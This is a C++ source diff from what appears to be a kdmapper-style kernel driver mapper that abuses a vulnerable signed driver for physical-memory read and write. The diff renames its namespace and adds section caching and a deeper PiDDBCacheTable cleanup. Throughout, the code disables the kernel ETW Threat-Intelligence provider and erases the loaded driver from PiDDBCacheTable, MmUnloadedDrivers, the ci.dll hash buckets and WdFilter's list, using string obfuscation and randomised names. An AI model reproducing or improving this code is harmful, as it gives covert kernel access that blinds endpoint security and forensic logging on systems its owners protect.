@@ -17,30 +17,30 @@ typedef struct _PHYS_RW_INPUT {
 } PHYS_RW_INPUT;
 #pragma pack(pop)
 
-HANDLE intel_driver::hDevice = 0;
-ULONG64 intel_driver::ntoskrnlAddr = 0;
-ULONG64 intel_driver::ntoskrnlPhysBase = 0;
-ULONG32 intel_driver::ntoskrnlImageSize = 0;
-bool intel_driver::runtimeReady = false;
-ULONG32 intel_driver::loadedDriverTimestamp = 0;
-std::wstring intel_driver::vulnerableDriverPath = L"";
-std::wstring intel_driver::loadedSymlinkName = L"";
-bool intel_driver::g_stubPoolReady = false;
-std::vector<intel_driver::StubEntry> intel_driver::g_stubPool;
+HANDLE vdrv::hDevice = 0;
+ULONG64 vdrv::ntoskrnlAddr = 0;
+ULONG64 vdrv::ntoskrnlPhysBase = 0;
+ULONG32 vdrv::ntoskrnlImageSize = 0;
+bool vdrv::runtimeReady = false;
+ULONG32 vdrv::loadedDriverTimestamp = 0;
+std::wstring vdrv::vulnerableDriverPath = L"";
+std::wstring vdrv::loadedSymlinkName = L"";
+bool vdrv::g_stubPoolReady = false;
+std::vector<vdrv::StubEntry> vdrv::g_stubPool;
 
 static uint64_t kernel_MmGetPhysicalAddress = 0;
 static std::wstring cachedDriverName = L"";
 static std::wstring cachedDriverPath = L"";
 static std::wstring cachedDriverDir = L"";
 
-std::wstring intel_driver::GetDriverNameW() {
+std::wstring vdrv::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
 		cachedDriverName = kdmUtils::GenerateServiceLikeName();
 	}
 	return cachedDriverName;
 }
 
-std::wstring intel_driver::GetDriverPath() {
+std::wstring vdrv::GetDriverPath() {
 	if (!cachedDriverPath.empty())
 		return cachedDriverPath;
 
@@ -64,23 +64,23 @@ std::wstring intel_driver::GetDriverPath() {
 	return cachedDriverPath;
 }
 
-std::wstring intel_driver::GetSymlinkName() {
+std::wstring vdrv::GetSymlinkName() {
 	return loadedSymlinkName;
 }
 
-HANDLE intel_driver::OpenDeviceHandle() {
+HANDLE vdrv::OpenDeviceHandle() {
 	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
 	return CreateFileW(devPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 }
 
-void intel_driver::CloseDeviceHandle() {
+void vdrv::CloseDeviceHandle() {
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
 		CloseHandle(hDevice);
 		hDevice = 0;
 	}
 }
 
-bool intel_driver::IsRunning() {
+bool vdrv::IsRunning() {
 	if (loadedSymlinkName.empty())
 		return false;
 	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
@@ -93,7 +93,7 @@ bool intel_driver::IsRunning() {
 	return false;
 }
 
-bool intel_driver::PopulateStubPool() {
+bool vdrv::PopulateStubPool() {
 	if (g_stubPoolReady)
 		return !g_stubPool.empty();
 
@@ -148,7 +148,7 @@ bool intel_driver::PopulateStubPool() {
 	return !g_stubPool.empty();
 }
 
-bool intel_driver::PickStub(uint64_t& out_kaddr, std::string& out_name) {
+bool vdrv::PickStub(uint64_t& out_kaddr, std::string& out_name) {
 	if (g_stubPool.empty())
 		return false;
 	size_t idx = kdmUtils::CryptoRand32() % g_stubPool.size();
@@ -157,7 +157,7 @@ bool intel_driver::PickStub(uint64_t& out_kaddr, std::string& out_name) {
 	return true;
 }
 
-NTSTATUS intel_driver::AcquireDebugPrivilege() {
+NTSTATUS vdrv::AcquireDebugPrivilege() {
 	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
 	if (ntdll == NULL)
 		return STATUS_UNSUCCESSFUL;
@@ -210,7 +210,7 @@ static void RestoreUsermodeEtw() {
 }
 
 static bool DisableKernelEtwTi() {
-	if (!intel_driver::runtimeReady)
+	if (!vdrv::runtimeReady)
 		return false;
 
 	static const uint8_t etwTiGuid[] = {
@@ -224,12 +224,12 @@ static bool DisableKernelEtwTi() {
 	};
 	char guidMask[] = "xxxxxxxxxxxxxxxx";
 
-	uintptr_t guidAddr = intel_driver::FindPatternInSectionAtKernel(
-		".data", intel_driver::ntoskrnlAddr, guidSig, guidMask);
+	uintptr_t guidAddr = vdrv::FindPatternInSectionAtKernel(
+		".data", vdrv::ntoskrnlAddr, guidSig, guidMask);
 
 	if (!guidAddr) {
-		guidAddr = intel_driver::FindPatternInSectionAtKernel(
-			".rdata", intel_driver::ntoskrnlAddr, guidSig, guidMask);
+		guidAddr = vdrv::FindPatternInSectionAtKernel(
+			".rdata", vdrv::ntoskrnlAddr, guidSig, guidMask);
 	}
 
 	if (!guidAddr)
@@ -240,14 +240,14 @@ static bool DisableKernelEtwTi() {
 	uint64_t enableOffset = provRegHandle + 0x30;
 
 	uint32_t enableInfo = 0;
-	if (!intel_driver::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
+	if (!vdrv::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
 		return false;
 
 	if (enableInfo == 0)
 		return true;
 
 	uint32_t zero = 0;
-	if (!intel_driver::WriteMemory(enableOffset, &zero, sizeof(zero)))
+	if (!vdrv::WriteMemory(enableOffset, &zero, sizeof(zero)))
 		return false;
 
 	return true;
@@ -425,7 +425,7 @@ static void SecureDeleteFile(const std::wstring& path) {
 	RemoveDirectoryW(dir.c_str());
 }
 
-bool intel_driver::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
+bool vdrv::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
 		return false;
 
@@ -449,7 +449,7 @@ bool intel_driver::PhysicalRead(uint64_t physical_address, void* buffer, uint64_
 	return true;
 }
 
-bool intel_driver::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
+bool vdrv::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
 		return false;
 
@@ -476,7 +476,7 @@ bool intel_driver::PhysicalWrite(uint64_t physical_address, const void* buffer, 
 	return true;
 }
 
-bool intel_driver::ScanForNtoskrnlPhysBase() {
+bool vdrv::ScanForNtoskrnlPhysBase() {
 	if (!ntoskrnlAddr)
 		return false;
 
@@ -501,7 +501,7 @@ bool intel_driver::ScanForNtoskrnlPhysBase() {
 		return false;
 
 	const uint64_t LARGE_PAGE = 0x200000;
-	const uint64_t MAX_SCAN = 0x100000000ULL;
+	const uint64_t MAX_SCAN = 0x80000000ULL;
 
 	uint8_t header_buf[0x1000];
 
@@ -537,7 +537,7 @@ bool intel_driver::ScanForNtoskrnlPhysBase() {
 	return false;
 }
 
-bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
+bool vdrv::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
 	if (!address || !buffer || !size)
 		return false;
 
@@ -573,7 +573,7 @@ bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
 	return true;
 }
 
-bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
+bool vdrv::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
 	if (!address || !buffer || !size)
 		return false;
 
@@ -609,7 +609,7 @@ bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
 	return true;
 }
 
-bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
+bool vdrv::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
 	if (!address || !buffer || !size)
 		return false;
 
@@ -635,11 +635,11 @@ bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_
 	return PhysicalWrite(physical_address, buffer, size);
 }
 
-NTSTATUS intel_driver::Load() {
+NTSTATUS vdrv::Load() {
 	if (kdmUtils::IsHvciWithBlocklistActive())
 		return STATUS_ACCESS_DENIED;
 
-	if (intel_driver::IsRunning())
+	if (vdrv::IsRunning())
 		return STATUS_ALREADY_REGISTERED;
 
 	if (vulnerableDriverPath.empty() || !std::filesystem::exists(vulnerableDriverPath))
@@ -691,68 +691,68 @@ NTSTATUS intel_driver::Load() {
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
 		RestoreUsermodeEtw();
-		intel_driver::Unload();
+		vdrv::Unload();
 		return STATUS_NOT_FOUND;
 	}
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
 	if (ntoskrnlAddr == 0) {
 		RestoreUsermodeEtw();
-		intel_driver::Unload();
+		vdrv::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
 
 	if (!ScanForNtoskrnlPhysBase()) {
 		RestoreUsermodeEtw();
-		intel_driver::Unload();
+		vdrv::Unload();
 		return STATUS_NOT_FOUND;
 	}
 
 	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
 	if (!kernel_MmGetPhysicalAddress) {
 		RestoreUsermodeEtw();
-		intel_driver::Unload();
+		vdrv::Unload();
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
 	runtimeReady = true;
 
 	IMAGE_DOS_HEADER dosHeader = { 0 };
-	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+	if (!vdrv::ReadMemory(vdrv::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
 		RestoreUsermodeEtw();
-		intel_driver::Unload();
+		vdrv::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
 
 	PopulateStubPool();
 
-	intel_driver::ScopedPriorityBoost _boost;
+	vdrv::ScopedPriorityBoost _boost;
 
 	DisableKernelEtwTi();
 
 	RestoreUsermodeEtw();
 
-	if (!intel_driver::ClearPiDDBCacheTable()) {
-		intel_driver::Unload();
+	if (!vdrv::ClearPiDDBCacheTable()) {
+		vdrv::Unload();
 		return STATUS_DELETE_PENDING | 0x1000;
 	}
 
-	if (!intel_driver::ClearKernelHashBucketList()) {
-		intel_driver::Unload();
+	if (!vdrv::ClearKernelHashBucketList()) {
+		vdrv::Unload();
 		return STATUS_DELETE_PENDING | 0x2000;
 	}
 
-	if (!intel_driver::ClearMmUnloadedDrivers()) {
-		intel_driver::Unload();
+	if (!vdrv::ClearMmUnloadedDrivers()) {
+		vdrv::Unload();
 		return STATUS_DELETE_PENDING | 0x3000;
 	}
 
-	intel_driver::ClearWdFilterDriverList();
+	vdrv::ClearWdFilterDriverList();
 
 	return STATUS_SUCCESS;
 }
 
-bool intel_driver::ClearWdFilterDriverList() {
+bool vdrv::ClearWdFilterDriverList() {
 	auto WdFilter = kdmUtils::GetKernelModuleAddress(ENC("WdFilter.sys"));
 	if (!WdFilter)
 		return true;
@@ -796,7 +796,7 @@ bool intel_driver::ClearWdFilterDriverList() {
 		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
 			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
 			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
-				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
+				if (wcsstr(ImageName.get(), vdrv::GetDriverNameW().c_str())) {
 					bool removedRuntimeDriversArray = false;
 					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
 					for (int k = 0; k < 256; k++) {
@@ -839,7 +839,7 @@ bool intel_driver::ClearWdFilterDriverList() {
 	return false;
 }
 
-NTSTATUS intel_driver::Unload() {
+NTSTATUS vdrv::Unload() {
 	runtimeReady = false;
 	kernel_MmGetPhysicalAddress = 0;
 	ntoskrnlPhysBase = 0;
@@ -847,6 +847,7 @@ NTSTATUS intel_driver::Unload() {
 
 	g_stubPool.clear();
 	g_stubPoolReady = false;
+	g_section_cache.clear();
 
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
 		CloseHandle(hDevice);
@@ -863,7 +864,7 @@ NTSTATUS intel_driver::Unload() {
 	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
 }
 
-uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
+uint64_t vdrv::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
 	if (!kernel_module_base)
 		return 0;
 
@@ -917,7 +918,7 @@ uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const 
 	return 0;
 }
 
-bool intel_driver::ClearMmUnloadedDrivers() {
+bool vdrv::ClearMmUnloadedDrivers() {
 	ULONG buffer_size = 0;
 	void* buffer = nullptr;
 
@@ -991,7 +992,7 @@ bool intel_driver::ClearMmUnloadedDrivers() {
 	return true;
 }
 
-PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
+PVOID vdrv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
 	ULONG_PTR Instr = (ULONG_PTR)Instruction;
 	LONG RipOffset = 0;
 	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
@@ -1000,11 +1001,11 @@ PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG Of
 	return ResolvedAddr;
 }
 
-bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
+bool vdrv::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
 	if (!Resource)
 		return 0;
 
-	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
+	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
 	if (!kernel_ExAcquireResourceExclusiveLite)
 		return 0;
 
@@ -1012,22 +1013,22 @@ bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) 
 	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
 }
 
-bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
+bool vdrv::ExReleaseResourceLite(PVOID Resource) {
 	if (!Resource)
 		return false;
 
-	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
+	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
 	if (!kernel_ExReleaseResourceLite)
 		return false;
 
 	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
 }
 
-BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
+BOOLEAN vdrv::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
 	if (!Table)
 		return false;
 
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
+	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
 	if (!kernel_RtlDeleteElementGenericTableAvl)
 		return false;
 
@@ -1035,11 +1036,11 @@ BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer)
 	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
 }
 
-PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
+PVOID vdrv::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
 	if (!Table)
 		return nullptr;
 
-	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
+	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
 	if (!kernel_RtlLookupElementGenericTableAvl)
 		return nullptr;
 
@@ -1049,7 +1050,7 @@ PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PV
 	return out;
 }
 
-nt::PiDDBCacheEntry* intel_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
+nt::PiDDBCacheEntry* vdrv::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
 	nt::PiDDBCacheEntry localentry{};
 	localentry.TimeDateStamp = timestamp;
 	localentry.DriverName.Buffer = (PWSTR)name;
@@ -1059,14 +1060,14 @@ nt::PiDDBCacheEntry* intel_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTabl
 	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
 }
 
-bool intel_driver::ClearPiDDBCacheTable() {
-	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
-	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");
+bool vdrv::ClearPiDDBCacheTable() {
+	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
+	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");
 
 	if (PiDDBLockPtr == NULL) {
-		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
+		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
 		if (PiDDBLockPtr == NULL) {
-			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
+			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
 			if (PiDDBLockPtr == NULL)
 				return false;
 			PiDDBLockPtr += 19;
@@ -1080,7 +1081,7 @@ bool intel_driver::ClearPiDDBCacheTable() {
 	}
 
 	if (PiDDBCacheTablePtr == NULL) {
-		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
+		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
 		if (PiDDBCacheTablePtr == NULL)
 			return false;
 		PiDDBCacheTablePtr += 2;
@@ -1093,9 +1094,53 @@ bool intel_driver::ClearPiDDBCacheTable() {
 		return false;
 
 	auto n = GetDriverNameW();
-	auto timestamp = intel_driver::loadedDriverTimestamp;
+	auto timestamp = vdrv::loadedDriverTimestamp;
 
 	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
+
+	if (pFoundEntry == nullptr) {
+		ULONG elemCount = 0;
+		ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, NumberGenericTableElements), &elemCount, sizeof(ULONG));
+		if (elemCount > 0 && elemCount < 4096) {
+			nt::PRTL_BALANCED_LINKS root = nullptr;
+			ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, BalancedRoot.RightChild), &root, sizeof(root));
+
+			std::vector<uintptr_t> stack;
+			if (root)
+				stack.push_back((uintptr_t)root);
+
+			while (!stack.empty() && !pFoundEntry) {
+				uintptr_t node = stack.back();
+				stack.pop_back();
+
+				nt::RTL_BALANCED_LINKS links{};
+				if (!ReadMemory(node, &links, sizeof(links)))
+					continue;
+
+				if (links.LeftChild)
+					stack.push_back((uintptr_t)links.LeftChild);
+				if (links.RightChild)
+					stack.push_back((uintptr_t)links.RightChild);
+
+				uintptr_t entry_candidate = node + sizeof(nt::RTL_BALANCED_LINKS);
+				UNICODE_STRING drvName{};
+				if (!ReadMemory(entry_candidate + offsetof(struct nt::_PiDDBCacheEntry, DriverName), &drvName, sizeof(drvName)))
+					continue;
+
+				if (!drvName.Buffer || drvName.Length == 0 || drvName.Length > 512)
+					continue;
+
+				auto nameBuf = std::make_unique<wchar_t[]>(drvName.Length / 2 + 1);
+				if (!ReadMemory((uintptr_t)drvName.Buffer, nameBuf.get(), drvName.Length))
+					continue;
+
+				if (wcsstr(nameBuf.get(), n.c_str())) {
+					pFoundEntry = reinterpret_cast<nt::PiDDBCacheEntry*>(entry_candidate);
+				}
+			}
+		}
+	}
+
 	if (pFoundEntry == nullptr) {
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
@@ -1133,11 +1178,59 @@ bool intel_driver::ClearPiDDBCacheTable() {
 		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
 	}
 
+	ULONG restartKeyBefore = 0;
+	ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &restartKeyBefore, sizeof(ULONG));
+	if (restartKeyBefore > 1) {
+		ULONG newKey = restartKeyBefore - 1;
+		WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &newKey, sizeof(ULONG));
+	}
+
+	PVOID zeroPtr = nullptr;
+	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, OrderedPointer), &zeroPtr, sizeof(PVOID));
+	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, RestartKey), &zeroPtr, sizeof(PVOID));
+
 	ExReleaseResourceLite(PiDDBLock);
 	return true;
 }
 
-uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
+struct CachedSection {
+	uint64_t module_base;
+	std::string section_name;
+	uint64_t section_vaddr;
+	uint32_t section_size;
+	std::vector<uint8_t> data;
+};
+
+static std::vector<CachedSection> g_section_cache;
+
+static CachedSection* GetOrCacheSection(const char* sectionName, uint64_t modulePtr) {
+	for (auto& c : g_section_cache) {
+		if (c.module_base == modulePtr && c.section_name == sectionName)
+			return &c;
+	}
+
+	ULONG sectionSize = 0;
+	uintptr_t section = vdrv::FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
+	if (!section || !sectionSize)
+		return nullptr;
+
+	if (sectionSize > 64 * 1024 * 1024)
+		return nullptr;
+
+	CachedSection newEntry;
+	newEntry.module_base = modulePtr;
+	newEntry.section_name = sectionName;
+	newEntry.section_vaddr = section;
+	newEntry.section_size = sectionSize;
+	newEntry.data.resize(sectionSize);
+	if (!vdrv::ReadMemory(section, newEntry.data.data(), sectionSize))
+		return nullptr;
+
+	g_section_cache.push_back(std::move(newEntry));
+	return &g_section_cache.back();
+}
+
+uintptr_t vdrv::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
 	if (!dwAddress)
 		return 0;
 
@@ -1156,7 +1249,7 @@ uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen
 	return result;
 }
 
-uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
+uintptr_t vdrv::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
 	if (!modulePtr)
 		return 0;
 	BYTE headers[0x1000];
@@ -1173,13 +1266,19 @@ uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t m
 	return section - (uintptr_t)headers + modulePtr;
 }
 
-uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
-	ULONG sectionSize = 0;
-	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
-	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
+uintptr_t vdrv::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
+	CachedSection* cs = GetOrCacheSection(sectionName, modulePtr);
+	if (!cs)
+		return 0;
+
+	uintptr_t local_result = kdmUtils::FindPattern((uintptr_t)cs->data.data(), cs->section_size, bMask, szMask);
+	if (local_result <= 0)
+		return 0;
+
+	return cs->section_vaddr + (local_result - (uintptr_t)cs->data.data());
 }
 
-bool intel_driver::ClearKernelHashBucketList() {
+bool vdrv::ClearKernelHashBucketList() {
 	uint64_t ci = kdmUtils::GetKernelModuleAddress(ENC("ci.dll"));
 	if (!ci)
 		return false;
@@ -1268,13 +1367,13 @@ bool intel_driver::ClearKernelHashBucketList() {
 	return false;
 }
 
-uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
+uint64_t vdrv::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
 	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();
 
-	static uint64_t kernel_ExAllocatePool2 = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePool2"));
+	static uint64_t kernel_ExAllocatePool2 = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePool2"));
 	if (kernel_ExAllocatePool2) {
 		const uint64_t POOL_FLAG_NON_PAGED          = 0x0000000000000040ull;
 		const uint64_t POOL_FLAG_NON_PAGED_EXECUTE  = 0x0000000000000080ull;
@@ -1284,7 +1383,7 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 			return allocated_pool;
 	}
 
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
 	if (!kernel_ExAllocatePool)
 		return 0;
 
@@ -1295,25 +1394,25 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	return allocated_pool;
 }
 
-bool intel_driver::FreePool(uint64_t address) {
+bool vdrv::FreePool(uint64_t address) {
 	if (!address)
 		return 0;
 
-	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExFreePool"));
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExFreePool"));
 	if (!kernel_ExFreePool)
 		return 0;
 
 	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
 }
 
-uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
+uint64_t vdrv::MmAllocateIndependentPagesEx(uint32_t size)
 {
 	uint64_t allocated_pages{};
 	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
 
 	if (!kernel_MmAllocateIndependentPagesEx)
 	{
